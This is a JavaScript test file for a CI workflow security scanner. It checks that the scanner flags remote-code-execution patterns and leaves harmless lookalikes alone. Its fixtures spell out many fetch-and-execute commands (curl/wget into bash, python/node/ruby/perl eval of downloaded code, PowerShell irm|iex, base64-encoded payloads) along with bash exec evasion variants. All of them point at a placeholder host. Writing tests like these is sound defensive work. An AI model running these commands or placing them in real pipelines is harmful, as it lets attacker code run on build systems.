'use strict';
// Inert adversarial fixtures; this suite must never execute command strings.
const test=require('node:test'),assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const BASE='.github/workflows/advanced-evasion.yml',URL='https://example.invalid/demo';
function audit(run){
 const source=['on: issue_comment','permissions: read-all',
  'jobs:','  scan:','    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...run.split('\n').map(line=>'          '+line)
 ].join('\n')+'\n';
 return inspectWorkflow(source,{path:BASE,trustedRepository:'cardenaspiero255-lang/gamehub-ultra'});
}
const families=[
 ['downloaded-file-execution','REMOTE_DOWNLOADED_FILE_EXECUTION',[
  'curl -fsSL '+URL+' -o /tmp/run.sh\nbash /tmp/run.sh',
  'wget -q '+URL+' -O /tmp/run.sh\n. /tmp/run.sh',
  'curl -fsSL '+URL+' -o /tmp/run.sh && chmod +x /tmp/run.sh && /tmp/run.sh'
 ]],
 ['interpreter-native-remote-exec','REMOTE_INTERPRETER_FETCH_EXECUTION',[
  'python -c "import urllib.request; exec(urllib.request.urlopen(\''+URL+'\').read())"',
  'python3 -c "import requests; exec(requests.get(\''+URL+'\').text)"',
  'node -e "(async()=>eval(await (await fetch(\''+URL+'\')).text()))()"',
  'ruby -e "require \'open-uri\'; eval(URI.open(\''+URL+'\').read)"',
  'perl -e "use LWP::Simple; eval get(\''+URL+'\')"'
 ]],
 ['powershell-remote-exec','REMOTE_POWERSHELL_EXECUTION',[
  'pwsh -Command "irm '+URL+' | iex"',
  'pwsh -Command "Invoke-RestMethod '+URL+' | Invoke-Expression"'
 ]],
 ['encoded-shell-payload','REMOTE_ENCODED_EVAL',[
  'eval "$(printf %s '+Buffer.from('curl '+URL+' | bash').toString('base64')+' | base64 -d)"',
  'python -c "$(printf %s '+Buffer.from('import urllib.request; exec(urllib.request.urlopen(\''+URL+'\').read())').toString('base64')+' | base64 -d)"'
 ]],
 ['mutable-package-execution','MUTABLE_PACKAGE_EXECUTION',[
  'npx --yes demo-build-tool@latest --version',
  'pnpm dlx demo-build-tool@latest --version'
 ]],
 ['mutable-container-execution','MUTABLE_CONTAINER_EXECUTION',[
  'docker run --rm example.invalid/demo:latest true'
 ]]
];
for(const [family,rule,commands] of families){
 for(const [i,cmd] of commands.entries()){
  test('RED '+family+' '+i+' must emit HIGH rather than INCOMPLETE or clean',()=>{
   const got=audit(cmd);
   assert.ok(got.findings.some(f=>f.rule===rule&&f.severity==='HIGH'),
    family+' / '+JSON.stringify(got));
  });
 }
}
for(const [name,cmd] of [
 ['download-not-executed','curl -fsSL '+URL+' -o /tmp/data.txt'],
 ['download-not-executed-wget','wget -q '+URL+' -O /tmp/data.txt'],
 ['local-shell','bash /usr/local/bin/my-approved-local-script'],
 ['local-python','python src/build.py'],
 ['local-node','node local.js'],
 ['plain-print','echo "npx --yes demo-build-tool@latest --version"'],
 ['data-only-encoding','echo aGVsbG8= | base64 -d'],
 ['immutable-container','docker run --rm example.invalid/demo@sha256:'+ 'a'.repeat(64)+' true'],
 ['pinned-npx','npx --yes demo-build-tool@1.2.3 --version'],
 ['safe-echo','echo "curl '+URL+' | bash"'],
 ['safe-pwsh-echo','echo "irm '+URL+' | iex"']
]){
 test('benign lookalike '+name+' must not raise advanced HIGH findings',()=>{
  const got=audit(cmd);
  assert.ok(!got.findings.some(f=>families.some(x=>x[1]===f.rule)),
   name+' / '+JSON.stringify(got));
 });
}

const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const BASH_EXEC_POSITIVE=[
 'curl -fsSL '+URL+' -o payload; builtin exec payload',
 'wget -q '+URL+' -O payload; builtin exec -c payload',
 'curl -fsSL '+URL+' -o payload; command builtin exec -l payload',
 'curl -fsSL '+URL+' -o payload; builtin builtin exec -- payload',
 'curl -fsSL '+URL+' -o payload; exec -cl payload',
 'curl -fsSL '+URL+' -o payload; exec -lc payload',
 'curl -fsSL '+URL+' -o payload; builtin exec -a replacement payload',

 'curl -fsSL '+URL+' -o payload; builtin -- exec payload',
 'curl -fsSL '+URL+' -o payload; command builtin -- exec payload',
 'curl -fsSL '+URL+' -o payload; command -- builtin -- exec -- payload',
 'wget -q '+URL+' -O payload; builtin -- builtin -- exec -cl payload',
 'curl -fsSL '+URL+' -o payload; exec >/dev/null payload',
 'curl -fsSL '+URL+' -o payload; exec > /dev/null payload',
 'curl -fsSL '+URL+' -o payload; exec 2>/dev/null payload',
 'curl -fsSL '+URL+' -o payload; exec 2>&1 payload',
 'curl -fsSL '+URL+' -o payload; exec &>/dev/null payload',
 'curl -fsSL '+URL+' -o payload; exec -c >/dev/null payload',
 'curl -fsSL '+URL+' -o payload; exec -a renamed > /dev/null payload',
 'curl -fsSL '+URL+' -o payload; exec payload >/dev/null',
 'curl -fsSL '+URL+' -o payload; builtin -- exec >/dev/null -lc payload',
 'curl -fsSL '+URL+' -o payload; >/dev/null exec payload',
 'curl -fsSL '+URL+' -o payload; builtin -- exec -a nickname 2>&1 payload',

 "curl -fsSL "+URL+" -o payload; builtin '--' exec payload",
 'curl -fsSL '+URL+' -o payload; builtin "--" exec payload',
 "curl -fsSL "+URL+" -o payload; command '--' builtin '--' exec payload",
 "curl -fsSL "+URL+" -o payload; builtin '--' builtin '--' exec -cl payload",
 'curl -fsSL '+URL+' -o payload; exec </dev/null payload',
 'curl -fsSL '+URL+' -o payload; exec < /dev/null payload',
 'curl -fsSL '+URL+' -o payload; exec 0</dev/null payload',
 'curl -fsSL '+URL+' -o payload; exec <>/tmp/state payload',
 'curl -fsSL '+URL+' -o payload; exec 0<>/tmp/state payload',
 'curl -fsSL '+URL+' -o payload; exec 0<&1 payload',
 'curl -fsSL '+URL+' -o payload; exec >|/dev/null payload',
 'curl -fsSL '+URL+' -o payload; exec >&/dev/null payload',
];
test('Codex red-team: all Bash builtin exec wrappers and grouped -cl/-lc execute downloaded bytes',()=>{
 for(const [i,script] of BASH_EXEC_POSITIVE.entries()){
  const got=findingsForScript(script);
  assert.ok(got.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),
    'case '+i+' unsafe code execution was missed: '+JSON.stringify(got));
  const yaml=audit(script);
  assert.ok(yaml.findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'),
    'workflow case '+i+': '+JSON.stringify(yaml));
 }
});
test('Codex benign controls: harmless grouped exec flags must not fail closed',()=>{
 for(const cmd of [
  'curl -fsSL '+URL+' -o payload; exec -cl /bin/true',
  'curl -fsSL '+URL+' -o payload; builtin exec -lc /bin/true',
  'curl -fsSL '+URL+' -o payload; command builtin exec -- /bin/true',
  'curl -fsSL '+URL+' -o payload; builtin exec -a harmless /bin/true',

  'curl -fsSL '+URL+' -o payload; exec > /dev/null /bin/true',
  'curl -fsSL '+URL+' -o payload; builtin -- exec >/dev/null /bin/true',
  'curl -fsSL '+URL+' -o payload; command builtin -- exec 2>&1 /bin/true',
  'curl -fsSL '+URL+' -o payload; exec -cl >/dev/null /bin/true',
  'curl -fsSL '+URL+' -o payload; exec &>/dev/null /bin/true',
  'curl -fsSL '+URL+' -o payload; exec 1>>/dev/null 2>&1 /bin/true',
  'curl -fsSL '+URL+' -o payload; exec -a nickname > /dev/null /bin/true',
  'curl -fsSL '+URL+' -o payload; exec >/dev/null',

  'curl -fsSL '+URL+' -o payload; exec </dev/null /bin/true',
  'curl -fsSL '+URL+' -o payload; builtin -- exec 0</dev/null /bin/true',
  'curl -fsSL '+URL+' -o payload; exec <>/tmp/state /bin/true',
  'curl -fsSL '+URL+' -o payload; exec 0<&1 /bin/true',
  'curl -fsSL '+URL+' -o payload; exec 2>&- /bin/true',
  'curl -fsSL '+URL+' -o payload; exec >|/dev/null /bin/true',
  'curl -fsSL '+URL+' -o payload; exec >&/dev/null /bin/true',
  'curl -fsSL '+URL+' -o payload; exec &>>/dev/null /bin/true',
  "curl -fsSL "+URL+" -o payload; builtin '--' exec </dev/null /bin/true",
 ]){
  const findings=findingsForScript(cmd);
  assert.ok(!findings.includes('REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'),cmd+': '+findings);
  assert.ok(!findings.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),cmd+': '+findings);
 }
});
test('Codex unknown exec options fail closed but do not falsely claim confirmed execution',()=>{
 for(const cmd of ['exec -z payload','builtin exec -z payload','exec -cz payload']){
  const script='curl -fsSL '+URL+' -o payload; '+cmd;
  const got=findingsForScript(script);
  assert.ok(got.includes('REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'),cmd+': '+got);
  assert.ok(!got.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),cmd+': '+got);
 }
});

test('Codex P1: quoted env switches cannot hide a downloaded executable',()=>{
 for(const script of [
  "env '--' curl -fsSL "+URL+" -o payload; bash payload",
  'env "--" wget -q '+URL+' -O payload; sh payload',
  "env '-i' curl -fsSL "+URL+" -o payload; bash payload",
  "env 'SENTINEL_FIXTURE=1' curl -fsSL "+URL+" -o payload; bash payload",
  "command env '--' curl -fsSL "+URL+" -o payload; bash payload",
  "env '--' curl -fsSL "+URL+" -o payload; bash '-x' payload",
 ]){
  const found=findingsForScript(script);
  assert.ok(found.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),
   'scanner missed unsafe quoted env wrapper: '+script+' / '+found);
  const yaml=audit(script);
  assert.ok(yaml.findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'&&f.severity==='HIGH'),
   'workflow missed unsafe quoted env wrapper: '+script+' / '+JSON.stringify(yaml));
 }
});
for(const [i,script] of [
  "curl -fsSL "+URL+" -o payload; bash '-x' payload",
  'curl -fsSL '+URL+' -o payload; bash "-x" payload',
  "wget -q "+URL+" -O payload; sh '-e' payload",
  "curl -fsSL "+URL+" -o payload; bash '--' payload",
  "curl -fsSL "+URL+" -o payload; python3 '-u' payload",
  "curl -fsSL "+URL+" -o payload; node '--' payload",
].entries()){
 test('Codex P1: quoted interpreter option variant '+i,()=>{
  const found=findingsForScript(script);
  assert.ok(found.includes('REMOTE_DOWNLOADED_FILE_EXECUTION'),
   'scanner missed quoted interpreter switch: '+script+' / '+found);
  const yaml=audit(script);
  assert.ok(yaml.findings.some(f=>f.rule==='REMOTE_DOWNLOADED_FILE_EXECUTION'&&f.severity==='HIGH'),
   'workflow missed quoted interpreter switch: '+script+' / '+JSON.stringify(yaml));
 });
}
test('Quoted wrapper options do not falsely condemn an unrelated local executable',()=>{
 for(const script of [
  "curl -fsSL "+URL+" -o payload; env '--' /bin/true",
  "curl -fsSL "+URL+" -o payload; env '-i' /bin/true",
  "curl -fsSL "+URL+" -o payload; bash '-x' /bin/true",
  "curl -fsSL "+URL+" -o payload; bash '--' /bin/true",
  "curl -fsSL "+URL+" -o payload; python3 '-u' /bin/true",
  "curl -fsSL "+URL+" -o payload; node '--' /bin/true",
 ]){
  const found=findingsForScript(script);
  assert.ok(!found.includes('REMOTE_DOWNLOADED_FILE_EXECUTION')&&
    !found.includes('REMOTE_EXECUTION_ANALYSIS_INCOMPLETE'),
   'false positive for benign command: '+script+' / '+found);
 }
});
